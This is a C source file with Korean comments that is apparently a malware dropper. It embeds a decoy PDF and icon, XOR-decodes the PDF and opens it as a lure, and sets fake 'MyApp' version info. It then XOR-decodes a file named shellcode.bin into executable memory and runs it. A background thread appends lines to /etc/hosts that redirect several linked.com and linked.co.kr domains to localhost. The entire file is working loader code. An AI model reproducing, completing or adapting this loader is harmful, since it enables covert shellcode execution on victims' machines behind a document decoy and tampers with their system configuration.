#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>



/* icon.ico */
extern unsigned char _binary_icon_ico_start[];
extern unsigned char _binary_icon_ico_end[];

/* 1.bin */
extern unsigned char _binary_1_bin_start[];
extern unsigned char _binary_1_bin_end[];

/* 1.pdf */
extern unsigned char _binary_1_pdf_start[];
extern unsigned char _binary_1_pdf_end[];

/* 버전 정보 문자열 */
__attribute__((section(".version")))
const char version_info[] =
    "CompanyName=Your Company Name\n"
    "FileVersion=1.0.0.0\n"
    "InternalName=MyApp\n"
    "OriginalFilename=MyApp\n"
    "ProductName=MyApp\n"
    "ProductVersion=1.0.0.0\n";



void xorDecrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int EtcHostDomainNameWrite() {
    int fd = open("/etc/hosts", O_RDWR | O_APPEND);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const char* extraText =
        "\n127.0.0.1 linked.com"
        "\n127.0.0.1 linked.co.kr"
        "\n127.0.0.1 kr.linked.com"
        "\n127.0.0.1 kr.linked.co.kr";

    ssize_t written = write(fd, extraText, strlen(extraText));
    if (written < 0) {
        perror("write");
        close(fd);
        return 1;
    }

    fsync(fd);
    close(fd);
    return 0;
}

// 스레드 함수
void* MyThreadFunction(void* arg) {
    EtcHostDomainNameWrite();
    return NULL;
}

int main(int argc, char* argv[]) {
    unsigned char xorKey = 0xff;
     // 리소스 크기 계산
    size_t iconSize      = _binary_icon_ico_end - _binary_icon_ico_start;
    size_t shellcodeSize = _binary_1_bin_end    - _binary_1_bin_start;
    size_t pdfSize       = _binary_1_pdf_end    - _binary_1_pdf_start;

    // 암호화된 PDF 저장
    const char *encryptedPath = "/tmp/encrypted.pdf";
    int fdEnc = open(encryptedPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fdEnc >= 0) {
        if (write(fdEnc, _binary_1_pdf_start, pdfSize) != (ssize_t)pdfSize) {
            perror("write encrypted.pdf");
        }
        close(fdEnc);
    } else {
        perror("open encrypted.pdf");
    }

    // 암호화된 PDF 복호화
    const char *decryptedPath = "/tmp/decrypted.pdf";
    int fdIn = open(encryptedPath, O_RDONLY);
    if (fdIn >= 0) {
        struct stat st;
        if (fstat(fdIn, &st) == 0 && st.st_size > 0) {
            size_t fileSize = st.st_size;
            unsigned char *buffer = malloc(fileSize);
            if (buffer) {
                if (read(fdIn, buffer, fileSize) == (ssize_t)fileSize) {
                    xorDecrypt(buffer, fileSize, xorKey);

                    int fdOut = open(decryptedPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (fdOut >= 0) {
                        if (write(fdOut, buffer, fileSize) != (ssize_t)fileSize) {
                            perror("write decrypted.pdf");
                        }
                        close(fdOut);

                        printf("[+] PDF 파일 저장 완료: %s\n", decryptedPath);

                        char cmd[512];
                        snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", decryptedPath);
                        system(cmd);
                    } else {
                        perror("open decrypted.pdf");
                    }
                } else {
                    perror("read encrypted.pdf");
                }
                free(buffer);
            }
        }
        close(fdIn);
    } else {
        perror("open encrypted.pdf");
    }

    
    

    // size_t icon_size = _binary_icon_ico_end - _binary_icon_ico_start;
    // size_t shellcode_size = _binary_1_bin_end - _binary_1_bin_start;
    // size_t pdf_size = _binary_1_pdf_end - _binary_1_pdf_start;

    // // printf("Icon size: %zu bytes\n", icon_size);
    // // printf("Shellcode size: %zu bytes\n", shellcode_size);
    // // printf("PDF size: %zu bytes\n", pdf_size);

    // FILE *fp = fopen("/tmp/encryt.pdf", "wb");
    // if (fp) {
    //     fwrite(_binary_1_pdf_start, 1, pdf_size, fp);
    //     fclose(fp);
    // }
    // {
    //     const char* pdfInputPath = "/tmp/encryt.pdf"; 
    //     const char* pdfOutputPath = "/tmp/decrty.pdf";

    //     int inFd = open(pdfInputPath, O_RDONLY);
    //     if (inFd >= 0) {
    //         struct stat st;
    //         fstat(inFd, &st);
    //         size_t pdfSize = st.st_size;

    //         unsigned char* buffer = malloc(pdfSize);
    //         if (buffer) {
    //             read(inFd, buffer, pdfSize);
    //             xorDecrypt(buffer, pdfSize, xorKey);
    //             int outFd = open(pdfOutputPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    //             if (outFd >= 0) {
    //                 write(outFd, buffer, pdfSize);
    //                 close(outFd);
    //                 printf("[+] PDF 파일 저장: %s\n", pdfOutputPath);
    //                 char cmd[512];
    //                 snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", pdfOutputPath);
    //                 system(cmd);
    //             }
    //             free(buffer);
    //         }
    //         close(inFd);
    //     }
    // }

    {
        const char* shellcodePath = "./shellcode.bin";
        int fd = open(shellcodePath, O_RDONLY);
        if (fd >= 0) {
            struct stat st;
            fstat(fd, &st);
            size_t size = st.st_size;

            void* mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (mem != MAP_FAILED) {
                read(fd, mem, size);
                xorDecrypt(mem, size, xorKey);
                ((void(*)())mem)(); 
                munmap(mem, size);
            }
            close(fd);
        }
    }
    pthread_t tid;
    pthread_create(&tid, NULL, MyThreadFunction, NULL);
    pthread_join(tid, NULL);

    return 0;
}